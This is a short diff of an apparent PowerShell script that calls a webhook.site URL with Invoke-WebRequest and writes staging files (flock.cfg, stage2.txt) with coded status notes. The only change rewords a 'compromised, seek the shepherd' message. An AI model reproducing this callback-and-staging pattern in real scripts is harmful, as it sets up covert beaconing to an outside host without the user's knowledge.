@@ -8,7 +8,7 @@ Invoke-WebRequest -Uri "https://webhook.site/e9ef4595-7848-4776-affc-48a3e01298b
 New-Item -Path "$folder\flock.cfg" -ItemType File -Force | Out-Null
 Add-Content -Path "$folder\flock.cfg" -Value "status=active"
 Add-Content -Path "$folder\flock.cfg" -Value "flock_id=1914"
-Add-Content -Path "$folder\flock.cfg" -Value "note=internal asset compromised. seek shepherd"
+Add-Content -Path "$folder\flock.cfg" -Value "note=internal operative compromised. seek the shepherd"
 
 New-Item -Path "$folder\stage2.txt" -ItemType File -Force | Out-Null
 Add-Content -Path "$folder\stage2.txt" -Value "Session=Active"
